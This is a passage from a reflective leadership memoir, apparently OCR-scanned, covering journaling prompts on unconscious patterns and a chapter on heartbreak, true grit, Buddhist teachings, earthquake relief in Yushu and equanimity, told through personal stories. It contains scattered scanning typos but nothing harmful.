ghosts in the machine to see the leader as the epitome\nof all that we are not that we fail to see their failings, their flesh and blood,\ntheir feet of clay. We can’t allow ourselves to see that if we prick them, they\nwill bleed.\nSuch projections can be dizzying.\n\nWhat if, instead of projecting the best of ourselves onto the Other, we\ntook back that part of ourselves with love and laughter? What if, instead of\nprojecting our banished dangerous rage onto the Other, we were to take it\nback and welcome it in? What if we saw the Other as a mirror and a\npathway to our growth?\n\nOur organizations might then turn away from the impulses to do violence\nto the self, the community, and the planet and toward being the means for\neach of us to grow up.\n\nLoving the Crow and Retrieving the Treasure\n\nOf all the many gifts Dr. Sayres gave to me, the one I’m most grateful for\ncomes in the form of an exasperated response to my endless worry that I\nwas not good enough: “Oh, Jerry,” she’d say, cutting me off, “you’re\nincorrigible.”\n\nSomehow, over the years, I took that in, my Crow squawked and relaxed,\nand I reveled even in my incorrigibility, my basically good humanity, and\nloved my way past all the whispered warnings of Crows and Soldiers.\n\nThis, then, is the highest calling of the warrior-leader: to take our seats as\nhumans and build humane companies, communities where it is gloriously\nsafe for others to be human. The leader—the person living into the immense\nsky of that honorific—is called to use the gifts of inquiry to see which\ndragons we may be running from and which princesses we may be running\ntoward. To notice with loving attention if we’re over-indexing on either the\nsoft, open front of the warrior or the strong back. For humane organizations\nare those that sit still, staying firmly in that place between the strong back\nof good processes, fiscal clarity, firmly held beliefs and values and the soft,\nopen heart of wisdom, empathy, and fierce gentleness.\n\nBy taking back the projected qualities, by retrieving the treasure, we’re\nless likely to build organizations that mimic and reinforce the wars of our\nchildhood and more likely to build communities of belonging and emerge\nthe adults we deserve to be. We get to become the adults we needed when\nwe were children.\n\nWe’re less likely, then, to be confused and seduced by notions of self-\nloathing. We’re less likely to lack an understanding of why good people,\nourselves included, do bad things. Despite there being so many companies\nstriving to create cultures declaring their intent to do no evil, we see that by\nbanishing the possibility of doing evil, we nearly ensure that evil will be\ndone.\n\nThis path of warrior leadership isn’t for the faint of heart. I laugh loudly\nwhen folks suggest that this is some sort of yoga-inspired soft-bellied call to\nleadership. “Namaste my ass,” I say with my Brooklyn-born chip firmly,\nsquarely, and proudly on my shoulder. “Try entering the cave, walking to\nthe dark recesses, and retrieving the treasure wa-a-a-y in the back. Then\ncome tell me about being soft.”\n\nLong ago, in response to dreadful migraines I’d developed as a child, Dr.\nSayres taught me the first of three magical questions: ““What am I not\nsaying that needs to be said?” Consider that question alone when you\nconsider your own wayward, twisting, tacking-across-the-surface-of-the-\nlake path to leadership and adulthood.\n\nWhat have I not been saying, recently, in the last few years, in all my life,\nthat needs and needed to be said? Consider and check your heart rate. That\nbeat, beat, beat you feel is not love but the dread felt at approaching fierce,\nfearful truth.\n\nConsider the ways the unsorted baggage of your life has kept you from\nnot only speaking but being heard: What am I saying that’s not being heard?\nConsider how you’ve silently seethed, waiting to manipulate the team to\nprove that you were right all along.\n\nConsider the ghosts in your machine, the click, click of the bolt-action\nrifle warning you of the dangers of truly listening to those with whom you\nshare this Earth, this journey: What’s being said that I’m not hearing? What\nis it that the people whom I love, the people I work with, the people who\npopulate the stories of my life are saying that I just can’t bear to hear? Is it\nperhaps that I have hurt them, disappointed them, or threatened their safety?\nCan I consider that my refusal to hear them—regardless of their chosen\nmethod of communication—furthers that pain?\n\nConsider these things and tell me again how this path of leadership is\nsoft.\n\nThe commitment to sort the unsorted baggage turns leadership into a\njourney of self-actualization. With that, work becomes not the impediment\nto our lives, not the repeated manifestation of our inner self-loathing, not\nthe thing that gets in the way, but the way we can live out our lives as they\nwere meant to be. As the poet John O’ Donohue wishes for each of us, “May\nleadership be for you / A true adventure of growth.”\n\nSuch inner work creates alignment, and alignment strengthens purpose\nand meaning. Welcoming home the Loyal Soldier and loving the Crow\nrelease us from the lacerations of guilt and shame and allow the warriors\nwithin to claim their seat. Love the Crow and grow.\n\nJournaling Invitations\n\nHow has who I am shaped the ways I lead others\nand myself?\n\nWhich of my unconscious patterns might be\nshowing up in my organization?\n\nHow have those patterns benefited my organization?\nHow might they be holding it back?\nChapter 8\nHeartbreak, Resilience, and the\nPath to Equanimity\n\nThe Heartbreak of Every Day\n\nHere’s a fact to break your heart: chestnut trees, parents, children, friends,\nlovers, and dreams all die.\n\nOur children—stepping into our footprints—struggle, fumbling their way\nthrough to adulthood, bearing skinned and scarred knees, broken hearts, and\nthe imprint of wretched disappointment. They manage this while navigating\nthe unrelenting compulsion to find the person they were born to be, toiling\nagainst forces that would have them be someone else. The resulting\nheartbreak becomes the means of self-discovery and, ultimately, self-\ncreation.\n\nACEO develops a rare blood cancer and funding for the company is\nthreatened. A fiancé calls off the wedding a month before the ceremony. A\nmarriage ends when a spouse dies. Customers reject us. Investors abandon\nus. Our companies, the embodiments of our wishes and dreams, crash and\nburn after years of riding the roller coaster. Our ability to love and be loved,\nto feel safe and that we belong is challenged daily by the everyday-ness of\nheartbreak and struggle.\n\nWe struggle with these painful realities—of birth, old age, sickness, and\ndeath—trying desperately, usually vainly, to see the heartbreak of every day\nnot as evidence of our own unworthiness and unlovability but as life merely\nunfolding, as intended. That struggle exacerbates the everyday pain; we\nstruggle to accept the roller-coaster ride for what it is: Jife.\n\nWe compound that pain by misunderstanding the notion of resiliency—\nthe capacity to bounce back. So often we’re told that we should be resilient,\nbut we’re rarely handed a map to get there. Worse, we mistakenly believe\nthat arriving at that state is the point of it all. The point of riding the roller\ncoaster isn’t to be better at riding roller coasters; it’s to learn how not to\nboard the roller coaster at all. Coney Island’s Cyclone is best appreciated\nfrom the ground. Resiliency isn’t the goal; it’s the path. The goal is the\nequanimity of a warrior.\n\nThe first step on the path of resiliency and the movement toward a\nwatrior’s equanimity are taken by having your heart broken open by the\neveryday skinning of your child’s knee, the dismembering of a tree, or the\ndeath of a spouse.\n\nFailure and the Passage of Trees\n\nI find impermanence to be the most heartrending attribute of the passage of\ntime.\n\nAs a boy, the horse chestnut tree provided the safety of a hollow in which\nI could temporarily escape the shame of our poverty and the angry,\nconfusing yelling that would often enough lead to violence. As a boy, I\nfound love deep within the fall-dropped spiky chestnut, which remained\nmilky white and soft and cool to the touch. I found safety when that milky-\nwhite softness would emerge after weeks buried deep in my sock drawer,\nwith the shimmering sienna of a blood bay Arabian. As a boy, I found\nbelonging beneath the spreading five-fingered leaves of the tree as my best\nfriend, Marcus, and I tossed a football high into the branches, hoping to\nknock down clusters of the spiky-skinned nuts.\n\nAnd then came the day when I’d heard the beep-beep-beep of the yellow-\norange New York City Parks Department payloader as it backed up to scoop\nup another load of the newly cut, sawdusty logs that were once, in total, the\nchestnut tree, now felled. My sanctuary gone. Beep-beep-beep.\n\n“It’s gone, it’s gone, it’s gone,” I’d wept into my mother’s apron, her\nhand stroking my head, smoothing the muscles of my neck. The heartfelt\n“there, there” of my mother’s comforting drawing me into the knowledge\nthat, through it all, here, in that place of heartache, confusion, and fear, was\nthe love of home. Here one minute, gone the next, heartbreak leading to\ncomfort.\n\nI’m haunted by the smell of freshly cut wood.\n\nPolar explorer Ben Saunders first contacted me in 2008. I was still\nfinding my footing as a coach, and he needed someone to help him figure\nout how to finance his passion, the work he was born to do. Or so he told\nme.\n\n“T was only a few days out,” he began, “when the ski binding broke and I\nhad to call the whole thing off.” A few months earlier, he’d set out to\nestablish a new record—the fastest to ski to the North Pole and back, from\nthe Canadian approach. A few days in, the entire enterprise had failed. And\nhere he was, broke, with no means of support. His entrepreneurial endeavor\nhad run out of cash and a friend had said I might help him figure out how to\nraise money to keep the effort alive.\n\nI startled him by noting that it must have sucked to have had to call it off.\nHe laughed with relief. It was nice to hear someone say, simply, “Well, that\nsucked.” But then, as I recall, he started to cry—which, I know now, was\nnot what he expected when he’d called the entrepreneur’s coach.\n\n“Do I even have a superpower?” Kent Cavender-Bares asked me when\nwe recorded our conversation for a podcast. His wife, having heard another\nepisode, had encouraged him to listen and, then, reach out to talk. His\nquestion in response to my exploration of how those things we’ve tossed\ninto our shadow have a deep power that, when accessed with compassion\nand skill, can drive our creativity. He cried quietly when I noted that his\nstruggle must be so painful.\n\nBehind his question lay the heartbreak that comes from having struggled\nso mightily to launch a business—in this case a robot designed to help\nfarmers apply fertilizer and pesticides more efficient and less harmful to the\nland they caretake. Kent’s dream is to heal the land while enabling people\nto grow more food. The heartbreak evident in his implicit questions: “What\nif my deep integrity, my commitment to simply telling how it is, is the\nreason we’re unable to fund-raise? Do I even have a superpower?” Would\nthe company be better off with someone else as CEO? Would my family\nand the world be better off if I stopped trying so hard to be an entrepreneur\nand just went back to the world of work, where we are seen merely as Tab A\nheaded for Slot B?\n\nThis Ride Is Dark and Scary\n\nWhile heartbreak is the early step on the path to equanimity, fear is the\nstumbling block leading to the sin of inaction. Fearing the dark rides of the\nConey Island of the mind, we choose not to act. Fearing Paris, we stay close\nto home. Fearing broken skis, failed businesses, and the scars that come\nfrom skinned knees, we stay small—listening more to our Loyal Soldier’s\nfear-filled and protective whispered warnings than to the quickening thump-\nthump, thump-thump, thump-thump of a heart that knows how it’s meant to\nbe.\n\nFear, and not some lack of grit or resiliency, blocks the emergence of our\nfully actualized and equanimous self. The warrior crouches behind walls of\nfear. Life should come with a placard: WARNING! THIS RIDE IS DARK AND\nSCARY.\n\nWhat is it we fear? Well, first, the threats to love, safety, and belonging.\nBut, really, we fear death, the pain of freshly cut logs from the felled\nsanctuary hurts. We fear shame because it rends our sense of who we might\nbe and—we believe—threatens our worthiness to be loved. We fear love\nbecause the object of our love may jump ship and abandon us, leaving us as\nbereft as a ten-year-old boy amid the cut logs of a sanctuary tree.\n\nWe fear the change inherent in our children growing into adulthood, the\ndeath of those close to us, the end of decades-long relationships. My fear of\nimpermanence leads me to wish to hold even the bittersweet painful\nmoments of life in amber, preserved like a prehistoric insect, to be admired\nbut, ironically, no longer lived.\n\nThis morning as I slipped on my sneakers, I was overwhelmed by a\nmemory of shopping with my daughter, Emma. She must have been five.\nShe needed new sneakers and, being the efficient shopper that I am, I\nsnatched her up and took her to the local mall. I waited—patiently, I told\nmyself—for her to choose which of the hundreds of pairs her five-year-old\nheart would like.\n\nThe chosen pair fitted, I paid at the register, and with her tiny hand in\nmine, we walked briskly from the store.\n“Daddy,” she asked, slightly out of breath as her little legs strode to keep\npace with my much larger, more important daddy-legs, “Daddy, did you\never buy something, and . . .” she paused, caught her breath, and continued,\n“and realize after you’ ve left the store that you really wanted the other\nthing?”\n\nScreech! Stop! I looked down to see fearful tears running down her\ncheeks. In my bid to be an efficient, effective father, I had failed to be with\nher and feel her heart. I bent, picking her up in one motion, and apologized\nfor moving so quickly in the world that I did not notice my little girl’s heart.\n\nI want to hold forever the bitterness of my having forgotten her and the\nsweetness of my having been called to take my seat as a warrior dad. I want\nto remember forever that we marched back to that store and bought a\nsecond pair because, in the end, it didn’t matter that, having worn the shoes\noutside the store, we couldn’t return those wrong shoes. The warrior dad\nbought the right shoes, the shoes his daughter wanted, and was reminded of\nthe importance of listening to his little girl’s heart.\n\nI want to be haunted by that bittersweet feeling forever; out of such\nheartbreak grew the resiliency with which I learned to listen to the fearful\nhearts of those I love and ride through the heartbreak of every day.\n\nThe Lovingkindness of True Grit\n\nI often speak of resiliency, and no matter how much I try to do otherwise, I\nstill manage to come across as if I’m speaking about grit. So, 1 speak of\ngrit. True grit is more than the capacity to grin and bear it. To understand\ntrue grit, we need to understand false grit.\n\nFalse grit is brittle. It’s the sense that we are nothing if we can’t take a\npunch. In fact, we define “taking a punch” as the ability to not feel pain\nwhen we are punched. False grit is dangerous. It feeds a stubbornness that,\nin turn, can feed delusion. We mistake the tendency to delude ourselves that\nour relationship will improve, our companies will succeed, if only we\ndouble down on our old patterns, grip the steering wheel until our knuckles\nwhiten, and bear down. Stubbornness is not the hallmark of the warrior.\n\nLeaders who persist out of stubbornness, believing themselves to be\ngritty, are at best delusional and, at worst, reckless.\nFalse grit awakens the Crow. One of its implicit messages is that we\nshould persist to prove that we aren’t as unworthy as the Crow claims. Yet a\nsecond implicit message is that if we feel like shit after being punched in\nthe face, it must mean that we are shit. The only way to escape the grip of\nfalse grit is to recognize its falsity.\n\nTrue grit is kind. True grit is persistent. True grit persists not in holding\non to false beliefs against all evidence but in believing in one’s inherent\nlovability and worthiness. True grit is the leader believing in the team’s\npurpose, its capacity to overcome obstacles, and the relevancy of the cause.\nTrue grit acknowledges the potential of failure, embraces the fear of\ndisappointment, and rallies the team to reach and try, regardless of the\npotential of loss.\n\nTrue grit, the capacity to stick with something to the end, stems from\nknowing oneself well enough to be able to forgive oneself. To have inquired\ndeeply and steadily enough to find the deep sense of purpose that is beyond\na personal mission statement. In that knowing of oneself, one is then able to\nstand as a single warrior amid a community of brokenhearted fellow\nleaders.\n\nWe see true grit in the lovingkindness of compassionate leaders, those\nwho embody the Buddhist principle of bodhicitta and strive to be of service\nto others. I feel the truth of that and yet I battle my own obstacles: How do\nyou serve others when your heart is pained and your warrior is terrified?\n\nSitting with Suffering\n\nI sat still in a stuffy white tent, despite the nearly unbearable August heat in\nthe mountains of Colorado. Six years after my first encounter with Pema\nChédréon, I took in her teachings again. Late-afternoon thunderstorms rolled\nin the distance, promising cool relief. We were three hundred students in all;\nmany sobbed gently while they watched their breath and eased their\nmonkey-minds.\n\nAt the talk that followed the sitting, I’d made my way to the microphone\nto ask a question. “Ani Pema,” I asked, my voice breaking slightly as I used\nher honorific title. “How do I forgive those who hurt me so badly? How do\nI free myself from the haunting pain of my childhood?” Shading her eyes to\nsee the questioner more clearly, she smiled and said, “Oh, hello, Jerry.”\nShe then recounted the story of the woman who, having suffered the\nunbearable heartbreak of the death of her child, was asked by the Buddha to\ngo to every household of those who had not suffered heartbreak and collect\na mustard seed. “Of course,” she smiled gently, “the woman came back to\nthe Buddha empty-handed.”\n\nThe point wasn’t for me to make small my suffering by comparing\nmyself to others. The point was to lean into the universality of the suffering.\n“T’d like you to add a practice to your meditation,” she answered. “Please\nconsider all the children—yourself included—from the past, present, and\nfuture who have, are, and will suffer equally. Send them love.”\n\nI began doing that, opening my heart to exactly that searing, piercing\npain—the universal pain of children who do not feel loved, safe, or that\nthey belong—and I sat still with all our suffering.\n\nYears later, I astonished myself by concluding that, in the wake of an\nearthquake in an area called Yushu in the ethnically Tibetan region of\nChina, I would do what I could to alleviate suffering. I was astonished by\nthe impulse; I’d never done anything like that before.\n\nI rode into the devastated city five months after the quake. Buildings\neverywhere lay toppled, and amid the piles of rubble that had been homes,\nclinics, and schools, the streets were barely discernible.\n\n“At least there aren’t bodies in the streets anymore,” said one of my\nguides, a woman who'd been in Yushu shortly after the quake. We then\nspent our days handing out thick, cotton tents, blankets, and other supplies.\nWe wandered through the rubble trying to help as we could. We came\nacross a man caring for a deaf and mute nun, the stench of her incontinence\noverwhelming. He’d lost his wife the morning of the earthquake. The stupa,\nthe sacred hemispherical structure containing relics around which she’d\nbeen making her ritualistic circumambulation, had toppled with the quake,\nkilling her.\n\nHe wept in gratitude for the food, clothing, and blankets we left. Putting\nhis hands together, he spoke a rapid Tibetan. One of my friends, Sonam,\nanother Tibetan guide, began crying as he spoke with the man. Assuming he\nwas giving us thanks, I asked Sonam what he’d said. “He was praying that,\nif an earthquake should happen again, and if a life needs to be taken, it\nshould be him for he’d never want another person to feel the heartbreak that\nhe now feels.”\nHeartbreak is universal. Keeping one’s heart open to the suffering of\nothers, even upon the failure of our companies and the death of a tree, is\nrare and the truest grit of all.\n\nTrue grit is an expression of resiliency. True grit is not only having your\nheart broken open by the death of a chestnut tree, the killing fall of a stupa’s\nstonework, and the swoon of a roller-coaster drop, but it’s also managing to\nkeep that heart open despite those losses. Bodhicitta means “awakened\nmind,” but it connotes open heart. Your mind cannot awaken while your\nheart remains closed.\n\nWhen leaders allow their hearts to stay broken open, they’re able to\nrecognize that the suffering they encounter every day among their\nemployees, colleagues, and investors is universal. Their fear of failure, for\nexample, is the very same fear their investors carry. It may be distorted by\nthe fun-house effect of the investors’ structural power—distorted by the\ninvestors’ Loyal Soldier and other shadowed qualities into an aggression—\nbut it is nevertheless the same fear. All loss threatens the love, safety, and\nbelonging of even those who hold power.\n\nDuring your next board meeting, collect a mustard seed from all those\npresent who don’t worry that the company’s failure will threaten their love,\nsafety, and sense of belonging. During your next all-hands staff meeting,\ncollect mustard seeds from all those who haven’t feared the loss of their job,\ndisappointing their loved ones, having their Crow’s exhortations about their\nimpostor status proved correct, or otherwise tumbling backward down the\nstaircase of life. Attempt to collect those mustard seeds and then stare at\nyour empty hands.\n\nAs leaders, our task is to feel our way through the heartbreaking, fear-\ninducing roller-coaster rides, learning not to vomit with each rise and dip.\nThen, just as we’ve built up the resiliency needed to recover from each\nnauseating dip, we find that we no longer have the need for it. The little\ntrain that makes up the Cyclone comes to a stop and we finally, wisely, get\noff the ride.\n\nListening for Equanimity\n\nMy sister Nicki has tacked up above her desk at work a quote I once gave to\na reporter. She tells me it makes her proud of me. I’d said that equanimity\nboils down to this: “Everything’s great, and I’m okay. Everything sucks,\nand I’m okay. Through years of radically inquiring within my broken-open\nheart, sitting still with that pain and its universal nature, I’ve been able to\nexperience the occasional true equanimity.”\n\nSitting still, listening to the Earth, I learned the power of contented\nsimplicity. Ten years ago, I made one of my teachers laugh out loud when I\ntold him of my plans to go on a vision quest. Having migrated from China\nas a boy, he spent most of his fifty years in the United States. Having been\nborn in China, he’d still occasionally use the “you Americans” construction.\n\n“You Americans,” he said with a shake of his head, “You think you can\nschedule a vision.” Laughing, he asked, “Do you think insight is going to\ncoincide with your vacation?”\n\nHis doubts notwithstanding, I left my home on Long Island and traveled\nto the four corners where Nevada, Colorado, Utah, and Arizona meet. My\nown doubts notwithstanding, I traveled to sit in a kiva with guides who—I\ndid not know at the time—would become my lifelong friends. My own\nfears notwithstanding, I found myself asking permission from a twisted and\ngnarled pine, before tying up my shelter, to use its branches for support. My\nself-consciousness notwithstanding, I found myself hearing a new name for\nmyself as the wind bent and shook the tops of the pines all around me.\n\nDuring my solo time, a time of fasting and solitude, I connected to the\nlove, safety, and belonging that came not from those around me but from\nmy own self. “Oh, so this is who I am,” I said, astonished by my discovery.\n“Oh, this, this is my pain.” Sheltered by only a thin yellow sheet of nylon,\nnaked except for light khaki shorts, taking small sips of water so as not to\ndie in the desert, with no books, no journal, no other means of distraction\nfrom the essence of me, I sat still, my skin raw and exposed, my senses\nwidening with an animal ferocity. I heard everything. I felt the Earth’s\npassage through space and, therefore, time. I heard the wisdom of boulders\nolder than humans. I walked among shards of busted pottery older than the\nUnited States. I heard stories told by a people who railed against the\nimpermanence of their lives by leaping desert chasms to leave handprints\non canyon walls.\n\nHearing all that, I dug deep into the sandbank of the river from which I\ndrew my water. I lit a fire and praised those who’d guided me to this point\nin my life. Under the gaze of millennia-old boulders, I vomited the\nheartbreak and pain of my childhood wounds until my throat was raw, my\ncheeks burned by tears, and my stomach, pained and emptied, had nothing\nto offer.\n\nI had no need beyond a thin sheet of nylon, a few sips of water, and\nknowledge that the Earth was able to hold and witness all that I have been,\nall that I am, and all that I will become. I sat in that contented simplicity as\nGrandfather Boulder lovingly held it all, receiving it as if to say, “Even with\nall this, you are still my son. You are loved, you are safe, and you belong to\nme as surely as your brothers and sisters, the boulders.”\n\nThe Earth held me, and I then learned the equanimity that comes from\nlistening. I returned the favor with a poem of my own:\n\nListen\n\nOn a brightening morning\n\nWhen dark places seem furthest,\n\nBrother Warrior comes,\n\nHelping me remember me.\n\nHe stands with legs firmly rooted\n\nin the earth,\n\narms at his side,\n\npalms open,\n\nback strong,\n\nheart exposed.\n\n“You were not given this life to carry only your sorrow.\nYou were not given this life only to lament.\nMake holy that which you were given:\n\nGo and listen.”\n\nOver his shoulder\n\nGrandfather Boulder,\n\nWith his never-ending smile,\n\nLooks on his two sons of the Earth:\n“Listening,” he reminds, “opens that which pain has closed.\nIn listening we are healing.\n\nWe are never healed but forever healing.\nWe are never loved but forever loving.”\n\nOur hearts close and we become both the builders and wardens of our\nprisons, our mind-forged manacles rattling with shame and fearful cries of\nour unlovability. Listening, he taught me, breaks the chains. Listening to\nothers, Ani Pema taught me, snaps the bonds of our woeful lamentations.\nListening to ourselves, deep self-inquiry, turns resiliency into growth and\nequanimity.\nMy rightful, appropriate, healthy response to the wounds of childhood\nwas anger. Unmet, disregarded, the anger turned into rage. Lacking the\nskills to work with the anger and rage, it would manifest into an anxious\ndoubt about my safety, my belonging. Yet, despite that ju-jitsu move of\nanger into anxiety, my underlying rage remained. Hulk remained.\n\nFollowing the Grandfather Boulder’s instructions to listen to my own\nself, I began to inquire after my rage, to look at the fears and the pain that\nlay behind it. I visualized that rage as the sweating, red-faced boy whose\nonly way of surviving was to try to chase with fury those who would\nhumiliate him. Assuring that boy that he had a right to his anger, I then\nasked about the ways he’d been denied and banished. I asked after the hurt\nbehind the rage and sat still with the stories he shared.\n\nSlowly, slowly and working together, we reassigned the rage. The red-\nfaced little boy no longer needed to chase and smash to guard against\nshame. That fierce rage stopped being a dangerous enemy and became a\nfierce guardian of the scared and less powerful. The red-faced boy\ntransformed into the guardian of my tender, open heart.\n\nI listened to myself; I grew.\n\nJust as I Am, I Am Enough\n\nAt our boot camps, the simple power of a walk with a friend often comes\nacross like magic. With a few simple instructions such as “listen and don’t\nfix,” folks come back from a twenty-minute stroll, weeping, having\nexperienced the power of listening and of being heard. Or having the\nburden of a secret held to keep others safe lifted and shared, making the\nload just a little lighter.\n\nWe gathered in a circle to reflect on what had happened and to tell each\nother’s stories. When Alisha heard her partner say the word burden once,\ntwice, and finally three times, she began crying. “I never knew I carried that\nword, burden, so deeply.”\n\nShe then shared a story of growing up in a family that felt like a burden\non the whole town. Beloved, they depended on the kindness of strangers.\nAnd rather than enhancing the sense of belonging that came from\ncommunity, it manacled Alisha with the shame of poverty. When her pillar-\nof-the-community father left the family (no doubt in pursuit of his own\nlove, safety, and belonging), she took on the burden of caring for her\nmother and brother. Yet another hallmark of the entrepreneur; yet another\ninstance of premature promotion into adulthood.\n\nShe built a company on the foundations of a business she’d launched in\nher teens. One designed to generate a profit, no matter how small, from day\none. And, furthermore, one never in need of capital—never a burden to\nothers. But this complex of “never be a burden and always relieve others’\nburdens” became a prison, and behind those bars, her resentment grew.\n\nOn her walk, she shared things about herself that she wished the people\nin her life knew about her. As her partner listened, she was able to hear her\nstory, and the rattling of her manacles. She heard the fear, shame, and pain\nbehind her resentful anger toward her brother. Later she went for a walk\nwith her mother and brother. They listened to each other.\n\nThe healing that followed the listening became a retelling and\nreimagining of the narrative of heartbreak that dominated their childhood of\npoverty and abandonment, confusion and shame. The listening led to a\nhealing that moved them past the resiliency of “we’ll never be a burden to\nothers” into the equanimity of the acceptance of the pain while dropping the\nshackles of the story of the pain. The stories they told about their experience\nwere transformed from instruments of survival into no-longer-needed\nartifacts in an otherwise equanimous life.\n\nLearning to listen, as I have done, helped me inquire into my own ways,\nto see my ghosts and programmed ways of being. Listening with an open,\nnon-judging heart allowed me to learn when I’d had enough of the world\nand its harsh need to change me into someone ‏آ‎ am not.\n\nThat learned declaration of enough supports the grittiest, most\nequanimous expression possible: that as broken-open as I may be, I am\nenough. Just as I am, I am enough.\n\nThe Space Between Clouds and Waves\n\n“The space between what’s wrong and right is where you’ll find me\nhiding,” sings Dave Matthews. The space between is where I am and the me\nthat’s hiding there is enough.\n\nOne of the most striking images from my many trips to Tibet was the\nreverently preserved dried skulls of great teachers. Occasionally, usually in\nthe homes of a village elder, ٣١٢'۹11 see among treasured items, the top half\nof such a skull. Moving beyond the impulse to recoil at such objects, I’m\nalways drawn in by the firmly held belief that amid the scribbles of what\nmust have been bone meeting brain are auspicious imprints testifying to the\nholiness of the departed. It’s believed that the scribbly indentations on the\nunderside of the skulls of great teachers often form the shape of a sitting\nBuddha. Buddhists believe so fervently in the power of equanimity, the\nfundamental basic goodness of all beings, the fundamental Buddha-nature\nof all things, that they see the Buddha in stones, trees, skies, and the bones\nof long-dead teachers. Buddha-nature resides in the most unexpected\nplaces.\n\nIn my struggle to fully take in the fundamental goodness of all things,\nmyself included, I strained to see what was so clear to my host in his\ndelicate relic. Even now, his wishing to believe, as well as his wish to be\nbelieved, is seared into my consciousness, fixed in place by the sensuous\nsmell of burning dried yak dung. For me, such is Tibet.\n\nIt was in Tibet that I first tasted the equanimity that arises from wishing\nthat the pain of death, loss, and failure were mine to bear, easing the lived\nexperiences of those around me. From my time in Tibet, I came to\nunderstand what clouds and waves can teach us about facing suffering with\ntrue grit.\n\nOf all the Buddhist saints I’ve come to know, only Milarepa seems like\nsomeone who could have been raised in Brooklyn. It’s not merely his “Eat\nme if you wish” attitude in the face of monstrous demons that makes me\nfeel like he could have walked down Flatbush Avenue. It’s the story of his\nheartbreak turned into resilience and equanimity. His father died when he\nwas just a boy, and his life of wealth, comfort, and ease were turned upside\ndown. Promoted prematurely, he took on the burden of caring for his now-\nbereft family. In her heartbreak, his mother encouraged him to take up black\nmagic. His leadership skills were honed at the whetstone of his mother’s\nsuffering and anger.\n\nHe traveled the area robbing and murdering. It’s said that he wore the\nfingerbones of his murder victims as a necklace. Later, he met the great\nteacher Marpa, who, through a series of backbreaking (and ego-\ndemolishing) tasks, helped Milarepa become a saintly poet and beloved\nmeditation master.\nIn one of the many songs that define his teachings, a student asks the\nmaster, “I can contemplate the sky, but clouds make me uneasy. Milarepa,\ntell me how to meditate on clouds.” Tell me, in effect, how I can achieve\nequanimity when the clouds get in the way of my seeing the empty,\nimmense sky.\n\nThe student goes on and asks again about the difficulty he has in\nmeditating on the calm beauty and serenity of the sea when all he can see is\nthe waves.\n\nWise Milarepa, the young boy who turned his suffering into violence\nonly to learn how to truly be with his pain, answers, “If the sky’s as easy as\nyou say, clouds are just the sky’s play.” He then adds that “waves are just\nthe sea’s play.” We can’t separate the clouds from sky or the waves from the\nsea. There is no space between our thoughts, however painful they might\nbe, and our mind. “Let your mind stay within the sea,” he advises, and so,\ntoo, “Let your mind stay within your mind.”\n\nThis Too Shall Pass\n\nWhether the heartbreak of daily life leads to resiliency and equanimity is\nthen a function of seeing the clouds, the waves, and thoughts at play. Every\nrise and fall of the roller coaster is life at play.\n\nWhat, then, is equanimity? It’s the space between right and wrong, guilt\nand innocence, sad and happy, greedy and satiated.\n\nIt’s the space between wishing things were different from what they are\nand bitterly giving up and giving in to the fuck-my-life-ness of the world\nand its harsh pain of birth, old age, sickness, and death. It’s the space where,\ndissatisfied with life as it is, we strive forward, despite knowing that our\nefforts may fail, will likely fail. We build our companies, our castles in the\nsky, our mandala sand paintings knowing that the winds will inevitably\nshift, and all will be gone. It’s the space where, despite the death of a tree,\nwe can feel the glorious reassurance that all shall be well.\n\nFor me, equanimity feels like coming home to a house I once occupied\nbefore I lost the ability to see the waves, the clouds, and my thoughts at\nplay.\n\nIn the ten years I’ve known Ben Saunders, I’ve never once asked him\nwhy he does the whole polar thing. Part of the reason I didn’t ask was that I\nalways thought that doing so would annoy him. But another reason why I\ndidn’t ask was that I knew he was out on the ice looking for something. I\nwas just never entirely sure what it was he was looking for.\n\nIn his attempt to complete his friend Henry’s journey, the solo crossing of\nAntarctica, it became clear to me what it was he was looking for. As I’ve\nwritten, about midway through the first leg of the journey, Ben was\nstruggling with the formidable sastrugi, the wind-driven ridges on the\nsurface of rock-hard snow. His progress was slow, and it was becoming\napparent that, unless he cut his rations in half, he’d run out of food before\nhe could be resupplied. He was faced with either stopping short of his goal,\na failure from a false grit point of view, or plunging on, risking his life and\ndying as his friend Henry had done.\n\nDuring our satellite phone call, when I’d given him the Zen-like advice to\ntake only small steps, I struggled to understand my role: Was I supposed to\nencourage him to soldier on or was I to tell him to call it quits? Soon\nenough I dropped my own notions of fixing the situation and simply\nlistened. As we talked, I heard something different in his voice. Yes, as he\noften did when we spoke while he was on the ice, he complained about how\nchallenging things were. He was hungry. He was tired. He was cold. But\nthis time I noticed a calmness in his voice, and when we spoke about his\nstopping the trip early, he said something remarkable. “Jerry,” he said,\nspeaking of his then fiancée and now wife, Philippa (“Pip”), “I’ve now got\nsomeone to come home to.”\n\nI realized then what it was that kept him going to the ice: he’d been\nlooking for home.\n\nAll humans seek love, safety, and belonging. For years, I thought Ben\nwandered the cold deserts because he was looking for love, safety, and\nbelonging. Through his struggle with the sastrugi, with the potential\nheartbreak of failing to live up to his heroic challenge of finishing his friend\nand mentor Henry’s dream, Ben came to the resiliency of carrying on and\nthe true grit of stopping the journey when continuing would have been\nmadness. With Pip in mind, he found the way to the love, safety, belonging,\nand equanimity of home.\n\nI remember lying on Dr. Sayres’s couch, speaking of the hole in my chest\nthat never seemed to close, and I shared the memory of my Howdy Doody\npuppet. Howdy Doody, the two-foot-long plug for that hole in my chest.\nEach night I hugged him tightly, wishing he’d enter me, filling that space\ninside, that deep emptiness that seemed forever a part of me.\n\n“What did he feel like?” she asked me.\n\n“Mine. Me. I don’t know … like a piece of me, the missing piece of\nme.”\n\nMom, uncomfortable that her son was so attached to a doll, shamed me\nfor loving him and, in that shame, I secreted him away in a closet. Boys\ndon’t cry. Boys don’t play with dolls. Boys don’t have holes in their hearts.\n\n“How did it feel when he was gone?” she asked.\n\n“Empty. I was bereft.”\n\n“Like when the horse chestnut tree was cut down?” she offered gently,\nunderstanding me in a way few have ever.\n\n“Exactly.” Without the tree, without my friend, I was bereft, homeless,\nunsheltered, and ill prepared to face the world.\n\n“Did I even deserve to feel at home?” I asked through tear-filled doubts.\nDid I even deserve equanimity?\n\nShe quieted my fears and yet again shared with me wisdom from her own\nlife experience. “Oh, Jerry,” she said with that so comforting chiding of a\nloving and understanding parent. “Don’t you know that this too shall pass?\nGam zeh ya’avor?”\n\nShe’d shared that phrase, “This too shall pass,” for years. 110 walk into\nher office, high from the glorious achievements of my hard-fought life.\nShe’d laugh and tell me she was proud of me and then lovingly remind me\nthat this too shall pass.\n\nJust as frequently, she’d offer the same wisdom when the heartbreaks of\nthe past and present would threaten to overwhelm me: “Oh, 